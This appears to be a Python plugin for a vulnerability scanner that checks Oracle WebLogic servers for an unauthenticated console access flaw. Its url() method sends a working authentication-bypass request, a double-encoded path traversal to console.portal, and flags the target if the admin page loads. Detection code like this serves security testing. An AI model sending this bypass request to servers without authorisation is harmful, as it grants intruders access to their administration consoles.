# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Weblogic未授权访问漏洞",
        "description": "利用该漏洞，未授权的用户可以绕过管理控制台的权限验证访问后台",
        "references": ["-"],
    }

    # def __condition__(self):
    #     return self.condition(
    #         matches=[
    #             {
    #                 "search": "body",
    #                 "keyword": "Welcome to Weblogic Application Server"
    #             },
    #             {
    #                 "search": "body",
    #                 "keyword": "/console/framework/skins/wlsconsole/images/login_WebLogic_branding.png"
    #             }
    #         ]
    #     )

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")',
            timeout=15
        )
        if 'quicklinksrowout' in r.text:
            return {"LoopholeInfo": self.__info__}
